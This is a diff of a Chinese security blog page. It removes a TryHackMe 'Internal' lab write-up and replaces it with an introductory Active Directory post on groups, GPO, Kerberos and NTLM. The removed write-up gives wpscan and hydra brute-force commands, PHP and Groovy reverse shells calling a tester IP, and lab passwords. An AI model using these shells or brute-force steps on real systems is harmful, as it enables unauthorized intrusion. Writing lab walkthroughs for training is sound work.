@@ -16,35 +16,37 @@
   <meta name="author" content="FSRM">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Internal信息收集：nmap扫一波  22和80端口开放 扫下后台  有一个phpadmin和wordpress的后台登录 使用wpscn扫一下看看情况 1wpscan --url &quot;http:&#x2F;&#x2F;10.10.50.8&#x2F;blog&quot; -eu   利用wpscan爆破密码 1wpscan --url &quot;http:&#x2F;&#x2F;10.10.50.8&#x2F;blog&quot; -U">
+    <meta name="description" content="Active Directory 基础知识Windows域当一个区域有多台计算机，难以逐个管理时，通常会将这些计算机的通用组件的管理集中在一个被称为Active Directory(AD)的存储库中,运行AD的服务器被称为DC(域控制器) 管理员通过控制AD从而控制其他计算机，并在AD中配置策略应用到网络中。 ADAD中包含很多对象，包括用户，机器，安全组，打印机等。 域中比较重要的安全组：">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Internal">
-<meta property="og:url" content="http://example.com/2024/11/28/Internal/index.html">
+<meta property="og:title" content="域渗透基础知识">
+<meta property="og:url" content="http://example.com/2024/12/03/Active%20Directory%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/index.html">
 <meta property="og:site_name" content="FSRM">
-<meta property="og:description" content="Internal信息收集：nmap扫一波  22和80端口开放 扫下后台  有一个phpadmin和wordpress的后台登录 使用wpscn扫一下看看情况 1wpscan --url &quot;http:&#x2F;&#x2F;10.10.50.8&#x2F;blog&quot; -eu   利用wpscan爆破密码 1wpscan --url &quot;http:&#x2F;&#x2F;10.10.50.8&#x2F;blog&quot; -U">
+<meta property="og:description" content="Active Directory 基础知识Windows域当一个区域有多台计算机，难以逐个管理时，通常会将这些计算机的通用组件的管理集中在一个被称为Active Directory(AD)的存储库中,运行AD的服务器被称为DC(域控制器) 管理员通过控制AD从而控制其他计算机，并在AD中配置策略应用到网络中。 ADAD中包含很多对象，包括用户，机器，安全组，打印机等。 域中比较重要的安全组：">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411282322401.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411282302680.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411282359335.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411290015774.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292205437.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292206145.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292221516.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292248911.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292309984.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292322884.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411300053613.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411300123382.png">
-<meta property="article:published_time" content="2024-11-28T14:45:09.823Z">
-<meta property="article:modified_time" content="2024-12-01T08:00:00.293Z">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202412202052794.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202412202053346.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202412202053404.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202412202055024.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202412202114130.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202412202154578.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501222106690.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d36f5a024c20fb480cdae8cd09ddc09f.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/84504666e78373c613d3e05d176282dc.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8fbf08d03459c1b792f3b6efa4d7f285.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2eab5cacbd0d3e9dc9afb86169b711ec.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501222212111.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501222213100.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501222216218.png">
+<meta property="article:published_time" content="2024-12-03T06:39:13.001Z">
+<meta property="article:modified_time" content="2025-01-26T16:25:03.450Z">
 <meta property="article:author" content="FSRM">
 <meta property="article:tag" content="tryhackme">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411282322401.png">
+<meta name="twitter:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202412202052794.png">
   
   
   
-  <title>Internal - FSRM</title>
+  <title>域渗透基础知识 - FSRM</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -251,7 +253,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Internal"></span>
+            <span id="subtitle" data-typed-text="域渗透基础知识"></span>
           
         </div>
 
@@ -262,8 +264,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-11-28 22:45" pubdate>
-          2024年11月28日 晚上
+        <time datetime="2024-12-03 14:39" pubdate>
+          2024年12月3日 下午
         </time>
       </span>
     
@@ -274,7 +276,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.6k 字
+          2.9k 字
         
       </span>
     
@@ -285,7 +287,7 @@
         
         
         
-          14 分钟
+          25 分钟
         
       </span>
     
@@ -330,66 +332,118 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Internal</h1>
+            <h1 id="seo-header">域渗透基础知识</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="Internal"><a href="#Internal" class="headerlink" title="Internal"></a>Internal</h1><h2 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h2><p>nmap扫一波</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411282322401.png" srcset="/img/loading.gif" lazyload alt="image-20241128232225305"></p>
-<p>22和80端口开放</p>
-<p>扫下后台</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411282302680.png" srcset="/img/loading.gif" lazyload alt="image-20241128230205435"></p>
-<p>有一个phpadmin和wordpress的后台登录</p>
-<p>使用wpscn扫一下看看情况</p>
-<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">wpscan</span> <span class="hljs-built_in">--url</span> <span class="hljs-string">&quot;http://10.10.50.8/blog&quot;</span> -<span class="hljs-string">eu</span><br></code></pre></td></tr></table></figure>
+                <h1 id="Active-Directory-基础知识"><a href="#Active-Directory-基础知识" class="headerlink" title="Active Directory 基础知识"></a>Active Directory 基础知识</h1><h2 id="Windows域"><a href="#Windows域" class="headerlink" title="Windows域"></a>Windows域</h2><p>当一个区域有多台计算机，难以逐个管理时，通常会将这些计算机的通用组件的管理集中在一个被称为<strong>Active Directory</strong>(AD)的存储库中,运行AD的服务器被称为DC(域控制器)</p>
+<p>管理员通过控制AD从而控制其他计算机，并在AD中配置策略应用到网络中。</p>
+<h2 id="AD"><a href="#AD" class="headerlink" title="AD"></a>AD</h2><p>AD中包含很多对象，包括用户，机器，安全组，打印机等。</p>
+<p>域中比较重要的安全组：</p>
+<table>
+<thead>
+<tr>
+<th><strong>安全组</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Domain Admins</td>
+<td>该组的用户拥有整个域的管理权限。默认情况下，他们可以管理域中的任何计算机，包括 DC。</td>
+</tr>
+<tr>
+<td>Server Operators</td>
+<td>此组中的用户可以管理域控制器。他们无法更改任何管理组成员身份。</td>
+</tr>
+<tr>
+<td>Backup Operators</td>
+<td>此组中的用户可以访问任何文件，而不受其权限的限制。它们用于执行计算机上的数据备份。</td>
+</tr>
+<tr>
+<td>Account Operators</td>
+<td>该组中的用户可以创建或修改域中的其他帐户。</td>
+</tr>
+<tr>
+<td>Domain Users</td>
+<td>包括域中所有现有的用户帐户。</td>
+</tr>
+<tr>
+<td>Domain Computers</td>
+<td>包括域中所有现有的计算机。</td>
+</tr>
+<tr>
+<td>Domain Controllers</td>
+<td>包括域中所有现有的 DC。</td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups</a>   官方文档</p>
+<p>OU用于对用户和机器进行分类，OU下可以有多个子OU，可以将OU类比成文件夹，而用户相当于里面的文件。</p>
+<h2 id="在-AD-中管理用户"><a href="#在-AD-中管理用户" class="headerlink" title="在 AD 中管理用户"></a>在 AD 中管理用户</h2><p>委托：现在将某一OU的权限转移给另外一个OU下的用户，而无需域管理员的介入，称为委托。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202412202052794.png" srcset="/img/loading.gif" lazyload alt="image-20241220205156513"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202412202053346.png" srcset="/img/loading.gif" lazyload alt="image-20241220205304223"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202412202053404.png" srcset="/img/loading.gif" lazyload alt="image-20241220205341303"></p>
+<p>然后选择需要委托的权限</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202412202055024.png" srcset="/img/loading.gif" lazyload alt="image-20241220205544962"></p>
+<p>然后phillip用户就有修改密码的权限了，这里的话如果通过 <strong>Active Directory Users and Computers</strong> 去修改密码是没权限的，就登录不了，然后就利用powershell进行修改密码</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-ADAccountPassword</span> sophie <span class="hljs-literal">-Reset</span> <span class="hljs-literal">-NewPassword</span> (<span class="hljs-built_in">Read-Host</span> <span class="hljs-literal">-AsSecureString</span> <span class="hljs-literal">-Prompt</span> <span class="hljs-string">&#x27;New Password&#x27;</span>) <span class="hljs-literal">-Verbose</span> //更改sophie用户的密码<br><span class="hljs-built_in">Set-ADUser</span> <span class="hljs-literal">-ChangePasswordAtLogon</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Identity</span> sophie <span class="hljs-literal">-Verbose</span>  //使得sophie用户下次登录时，强制更改密码<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411282359335.png" srcset="/img/loading.gif" lazyload alt="image-20241128235936207"></p>
-<p>利用wpscan爆破密码</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wpscan --url <span class="hljs-string">&quot;http://10.10.50.8/blog&quot;</span> -U admin -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt<br></code></pre></td></tr></table></figure>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202412202114130.png" srcset="/img/loading.gif" lazyload alt="image-20241220211453018"></p>
+<p>上面就是修改成功了，注意密码不能设置太过简单。</p>
+<h2 id="在-AD-中管理计算机"><a href="#在-AD-中管理计算机" class="headerlink" title="在 AD 中管理计算机"></a>在 AD 中管理计算机</h2><p>根据设备的用途对其进行分类。</p>
+<p><strong>1.Workstations</strong></p>
+<p>工作站是 Active Directory 域中最常见的设备之一。域中的每个用户都可能登录工作站。这是他们用来工作或进行正常浏览活动的设备。这些设备绝不应该有特权用户登录。</p>
+<p><strong>2. Servers</strong></p>
+<p>服务器是 Active Directory 域中第二常见的设备。服务器通常用于向用户或其他服务器提供服务。</p>
+<p><strong>3. Domain Controllers</strong></p>
+<p>域控制器是 Active Directory 域中第三大最常见的设备。域控制器允许您管理 Active Directory 域。这些设备通常被视为网络中最敏感的设备，因为它们包含环境中所有用户帐户的哈希密码。</p>
+<h2 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202412202154578.png" srcset="/img/loading.gif" lazyload alt="image-20241220215444288"></p>
+<p>首先创建一个GPO的合集，里面相当于是一些制定的规则 然后再应用到不同的OU中，如上图所示。同时，一个GPO影响 链接到的OU及其子OU。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501222106690.png" srcset="/img/loading.gif" lazyload alt="image-20250122210629502"></p>
+<p>上面是GPO的一些设置信息，里面包含不同的策略。</p>
+<h3 id="GPO分发"><a href="#GPO分发" class="headerlink" title="GPO分发"></a>GPO分发</h3><p>GPO 通过名为 <code>SYSVOL</code> 的网络共享分发到网络，该共享存储在 DC 中。域中的所有用户通常都应能够通过网络访问此共享，以定期同步其 GPO。SYSVOL 共享默认指向<code>C:\Windows\SYSVOL\sysvol\</code>.</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">gpupdate <span class="hljs-string">/force</span>  <span class="hljs-string">//</span>及时同步GPO信息<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411290015774.png" srcset="/img/loading.gif" lazyload alt="image-20241129001527658"></p>
-<p>得到密码 my2boys</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292205437.png" srcset="/img/loading.gif" lazyload alt="image-20241129220505885"></p>
-<p>这个地方可以添加php代码 然后具体路径的话 可以去网上找到</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>nternal.thm<span class="hljs-regexp">/blog/</span>wp-content<span class="hljs-regexp">/themes/</span>twentyseventeen<span class="hljs-regexp">/404.php/</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292206145.png" srcset="/img/loading.gif" lazyload alt="image-20241129220611076"></p>
-<p>添加一个反弹shell的命令</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;nc -e /bin/bash 主机IP 主机端口&quot;</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
-
-<p>或者</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&quot;10.14.74.6&quot;</span>;<br><span class="hljs-variable">$port</span> = <span class="hljs-string">&quot;4444&quot;</span>;<br><span class="hljs-variable">$sock</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$port</span>);<br><span class="hljs-variable">$descriptorspec</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-number">0</span> =&gt; <span class="hljs-variable">$sock</span>,<br>        <span class="hljs-number">1</span> =&gt; <span class="hljs-variable">$sock</span>,<br>        <span class="hljs-number">2</span> =&gt; <span class="hljs-variable">$sock</span><br>);<br><span class="hljs-variable">$process</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);<br><span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$process</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p>第二个可以连上 然后搞一个python的 交互shell</p>
-<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python -c <span class="hljs-symbol">&#x27;import</span> pty; pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure>
-
-<p>发现现在只是ww-data用户 看一下数据库是否有其他用户的信息</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292221516.png" srcset="/img/loading.gif" lazyload alt="image-20241129222147415"></p>
-<p>连接上去看看情况</p>
-<p>里面就有一个admin用户 并没有 我们想要的aubreanna用户的密码 查看/etc/shadow的内容提示没权限</p>
-<p>这里看了一下wp是在opt目录下发现的信息(以后还得仔细地翻看每个目录下的关键信息)</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292248911.png" srcset="/img/loading.gif" lazyload alt="image-20241129224826818"></p>
-<p>得到密码之后ssh登录上去即可 bubb13guM!@#123</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在 jenkins.txt 中可以看到还有一层内网的服务 </p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292309984.png" srcset="/img/loading.gif" lazyload alt="image-20241129230924923"></p>
-<p>利用ssh将这个ip上的服务转移到本地的8081端口上</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -L <span class="hljs-number">8081</span>:<span class="hljs-number">172.17.0.2:8080</span> aubreanna@<span class="hljs-number">10.10.201.110</span><br></code></pre></td></tr></table></figure>
-
-<p>然后访问localhost:8081 即可</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292322884.png" srcset="/img/loading.gif" lazyload alt="image-20241129232248828"></p>
-<p>我这里利用hydra去爆破密码了</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">hydra -s <span class="hljs-number">8081</span> -V -f -t <span class="hljs-number">50</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> http-form-post <span class="hljs-string">&quot;/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in&amp;Login=Login:Invalid username or password&quot;</span> -l admin -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt<br></code></pre></td></tr></table></figure>
-
-<p>能得到密码 spongebob</p>
-<p>登录后台之后 再script下可以进行命令执行</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411300053613.png" srcset="/img/loading.gif" lazyload alt="image-20241130005302498"></p>
-<p>进行一个反弹shell</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">r = Runtime<span class="hljs-selector-class">.getRuntime</span>()<br><br><span class="hljs-selector-tag">p</span> = r<span class="hljs-selector-class">.exec</span>(<span class="hljs-selector-attr">[<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/10.14.74.6/4444;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>]</span> as String<span class="hljs-selector-attr">[]</span>)<br><br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.waitFor</span>()<br></code></pre></td></tr></table></figure>
-
-<p>得到shell之后 再次再opt目录下找到root的密码 tr0ub13guM!@#123</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411300123382.png" srcset="/img/loading.gif" lazyload alt="image-20241130012326308"></p>
-<p>远程登录即可</p>
+<h2 id="身份验证方法"><a href="#身份验证方法" class="headerlink" title="身份验证方法"></a>身份验证方法</h2><p>使用 Windows 域时，所有凭据都存储在域控制器中。每当用户尝试使用域凭据向服务进行身份验证时，该服务都需要请求域控制器验证它们是否正确。Windows 域中的网络身份验证可以使用两种协议：</p>
+<ul>
+<li><strong>Kerberos：</strong>任何较新版本的 Windows 均使用 Kerberos。这是任何较新域中的默认协议。</li>
+<li><strong>NetNTLM：</strong>为了兼容性目的而保留的旧式身份验证协议。</li>
+</ul>
+<h3 id="Kerberos身份验证"><a href="#Kerberos身份验证" class="headerlink" title="Kerberos身份验证"></a>Kerberos身份验证</h3><p>Kerberos身份验证是 Windows 最新版本的默认身份验证协议。使用Kerberos登录服务的用户将被分配票证。将票证视为先前身份验证的证明。拥有票证的用户可以将其出示给服务，以证明他们之前已通过网络身份验证，因此可以使用该服务。</p>
+<p>当使用Kerberos进行身份验证时，会发生以下过程：</p>
+<ol>
+<li><p>用户将其用户名和使用从其密码派生的密钥加密的时间戳发送到**密钥分发中心 (KDC)**，该服务通常安装在域控制器上，负责在网络上创建Kerberos票证。</p>
+<p>KDC 将创建并返回一个<strong>票证授予票证 ( TGT )<strong>，这将允许用户请求更多票证以访问特定服务。需要票证才能获得更多票证听起来可能有点奇怪，但它允许用户在每次想要连接到服务时请求服务票证而无需传递其凭据。除了 TGT 之外，还会向用户提供</strong>会话密钥</strong>，他们将需要该密钥来生成以下请求。</p>
+<p>请注意，TGT是使用<strong>krbtgt</strong>帐户的密码哈希加密的，因此用户无法访问其内容。必须知道，加密的TGT包含会话密钥的副本作为其内容的一部分，并且 KDC 无需存储会话密钥，因为它可以通过解密TGT来恢复副本（如果需要）。</p>
+</li>
+<li><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d36f5a024c20fb480cdae8cd09ddc09f.png" srcset="/img/loading.gif" lazyload alt="Kerberos 步骤 1"></p>
+</li>
+<li><p>当用户想要连接到网络上的服务（如共享、网站或数据库）时，他们将使用其TGT向 KDC 请求<strong>票证授予服务 (TGS)<strong>。TGS 是仅允许连接到为其创建的特定服务的票证。要请求 TGS，用户将发送使用会话密钥加密的用户名和时间戳，以及 TGT和服务</strong>主体名称 (SPN)，</strong>后者指示我们打算访问的服务和服务器名称。</p>
+<p>因此，KDC 将向我们发送 TGS 以及<strong>服务会话密钥</strong>，我们需要该密钥来验证我们要访问的服务。TGS 使用从 <strong>服务所有者哈希</strong>派生的密钥进行加密。服务所有者是服务在其下运行的用户或机器帐户。TGS 在其加密内容中包含服务会话密钥的副本，以便服务所有者可以通过解密 TGS 来访问它。</p>
+</li>
+<li><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/84504666e78373c613d3e05d176282dc.png" srcset="/img/loading.gif" lazyload alt="Kerberos 步骤 2"></p>
+</li>
+<li><p>然后，TGS 可以发送到所需的服务以进行身份验证并建立连接。该服务将使用其配置的帐户的密码哈希来解密 TGS 并验证服务会话密钥。</p>
+</li>
+</ol>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8fbf08d03459c1b792f3b6efa4d7f285.png" srcset="/img/loading.gif" lazyload alt="Kerberos 步骤 3"></p>
+<h3 id="NetNTLM-身份验证"><a href="#NetNTLM-身份验证" class="headerlink" title="NetNTLM 身份验证"></a>NetNTLM 身份验证</h3><p>NetNTLM 采用质询-响应机制。 整个过程如下：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2eab5cacbd0d3e9dc9afb86169b711ec.png" srcset="/img/loading.gif" lazyload alt="NetNTLM 身份验证"></p>
+<ol>
+<li>客户端向其想要访问的服务器发送身份验证请求。</li>
+<li>服务器生成一个随机数并将其作为挑战发送给客户端。</li>
+<li>客户端将其NTLM密码哈希与质询（和其他已知数据）相结合，以生成对质询的响应并将其发送回服务器进行验证。</li>
+<li>服务器将质询和响应转发给域控制器进行验证。</li>
+<li>域控制器使用该质询重新计算响应，并将其与客户端发送的原始响应进行比较。 如果两者匹配，则客户端通过身份验证； 否则，访问被拒绝。 身份验证结果将发送回服务器。</li>
+<li>服务器将认证结果转发给客户端。</li>
+</ol>
+<h2 id="树木、森林和信托"><a href="#树木、森林和信托" class="headerlink" title="树木、森林和信托"></a>树木、森林和信托</h2><h3 id="树"><a href="#树" class="headerlink" title="树"></a>树</h3><p>假设一家公司下面，有两个分公司，这样相互组成了一个树。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501222212111.png" srcset="/img/loading.gif" lazyload alt="image-20250122221228894"></p>
+<h3 id="森林"><a href="#森林" class="headerlink" title="森林"></a>森林</h3><p>假设一家公司不仅再本国有公司，在其他国家也有公司，这样组合在一起就构成了一个森林。</p>
+<p>具体的话就是将具有不同命名空间的树组合到一个网络中，就构成了森林。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501222213100.png" srcset="/img/loading.gif" lazyload alt="image-20250122221350953"></p>
+<h3 id="信托"><a href="#信托" class="headerlink" title="信托"></a>信托</h3><p>当一个树中的某个用户，需要访问另外一个树中的用户时，这就需要建立信任关系，分为单向信任和双向信任。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501222216218.png" srcset="/img/loading.gif" lazyload alt="image-20250122221634085"></p>
 
                 
               </div>
@@ -435,8 +489,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Internal</div>
-      <div>http://example.com/2024/11/28/Internal/</div>
+      <div>域渗透基础知识</div>
+      <div>http://example.com/2024/12/03/Active Directory 基础知识/</div>
     </div>
     <div class="license-meta">
       
@@ -448,13 +502,13 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年11月28日</div>
+          <div>2024年12月3日</div>
         </div>
       
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2024年12月1日</div>
+          <div>2025年1月27日</div>
         </div>
       
       
@@ -485,9 +539,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/12/03/Active%20Directory%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="域渗透基础知识">
+                      <a href="/2025/01/02/Empire%20LupinOne/" title="Empire_LupinOne">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">域渗透基础知识</span>
+                        <span class="hidden-mobile">Empire_LupinOne</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -495,8 +549,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/11/08/Daily%20Bugle/" title="Daily Bugle">
-                        <span class="hidden-mobile">Daily Bugle</span>
+                      <a href="/2024/11/28/Internal/" title="Internal">
+                        <span class="hidden-mobile">Internal</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
